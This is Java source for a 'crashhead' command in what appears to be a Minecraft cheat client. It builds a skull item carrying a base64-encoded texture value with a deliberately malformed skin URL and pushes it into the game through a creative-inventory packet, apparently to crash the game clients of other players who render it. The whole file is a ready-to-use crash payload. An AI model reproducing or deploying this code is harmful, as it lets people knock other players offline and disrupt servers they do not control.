package slavikcodd3r.rainbow.command.commands;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import slavikcodd3r.rainbow.command.Com;
import slavikcodd3r.rainbow.command.Command;
import slavikcodd3r.rainbow.utils.ClientUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

@Com(names = { "crashhead", "crashskull", "ch", "cs" })
public class CrashHead extends Command
{
	
	Minecraft mc = Minecraft.getMinecraft();
    public static final String BYPASSCRASHVALUE = "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByb2ZpbGVJZCI6ImZkZWI1ZjVlYzQ5ODRkNTM4MGIzMjVlNDMwNTEzZGIyIiwicHJvZmlsZU5hbWUiOiJHYXJrb2x5bSIsInNpZ25hdHVyZVJlcXVpcmVkIjp0cnVlLCJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6IiAubW9qYW5nLmNvbSJ9fX0=";
    
    @Override
    public String getHelp() {
        return "crashhead";
    }
    
    @Override
    public void runCommand(final String[] args) {
    	if (mc.playerController.isNotCreative()) {
    		ClientUtils.sendMessage("You need to be in creative mode to do this!");
    	}
        final ItemStack itm = new ItemStack(Items.skull, 1, 3);
        final NBTTagCompound base = new NBTTagCompound();
        final NBTTagCompound skullOwner = new NBTTagCompound();
        skullOwner.setString("Id", "fdeb5f5e-c498-4d53-80b3-25e430513db2");
        skullOwner.setString("Name", "SlavikCodd3r");
        final NBTTagCompound properties = new NBTTagCompound();
        final NBTTagList textures = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        tag.setString("Signature", "Ff/owu5QIoK1DoqJaJPcYTkNlIqH0JGvsKz8sAnaxOX0OCKk0WkfYxDWDnhu+SaTNzwgaEMkr82dHpJ3dL1OD+GRPkkzDbeEMe6JHZeZOOHQE5pCe1YhL0AvK+UCy2Cliztj3oavr0LxWcW0HuoCsYk80jTcjcBY8um3NlwNZtrfEd44B+XEQ1BNk7Ypf0XNy5N6iOp0UFGue6CoDLNzFuVfLu54xXQlcHVylTEtNv1rJOT4K3p3szdIvQjdjh8n2zFdwjfACFovqk2kKW0aizBvWUS8/F3yeY2+P1gUFXDHAfQ3i70i0FjPy05eB8qIIxrfP/HBmm7eLDYjy3GcUwpxTBKYU/92OIkCJttaiJh6A0jF9AVDJSJv1qu2OguzQIHod3Wf1ZgpnBLEOSjJ0wDMK9tZbN6EDGEAReBhOi/qNL3jGlE9+1TdubVWgmih3iOI3QjozRNvzXpExWQQ4yOsrwnohYTJ8ajIdph3bcMTqcgbkZKG2iyqOJHmKT6YT9d/MAZ6HlJqZNUcn77N6jy7wBHYuvsSTlsfT5s+NuDDPfv3Z480fx0wSYrjbCYtE7q7FQbnxWoJhSYwdq2/1aqyv4YqLhbbek2VYh05ucM8xprsYCbXVvFylwt07sur24SrSi9tWF9UqR9VJsTTB/jtq7nVeLzSfh4UnXWFDu0=");
        tag.setString("Value", "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByb2ZpbGVJZCI6ImZkZWI1ZjVlYzQ5ODRkNTM4MGIzMjVlNDMwNTEzZGIyIiwicHJvZmlsZU5hbWUiOiJHYXJrb2x5bSIsInNpZ25hdHVyZVJlcXVpcmVkIjp0cnVlLCJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6IiAubW9qYW5nLmNvbSJ9fX0=");
        textures.appendTag(tag);
        properties.setTag("textures", textures);
        skullOwner.setTag("Properties", properties);
        base.setTag("SkullOwner", skullOwner);
        itm.setTagCompound(base);
        itm.setStackDisplayName("§f§l§ki §c§lR§6§la§e§li§a§ln§b§lb§1§lo§d§lw §7§l2.0 §f§l§ki");
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itm));
    }
}
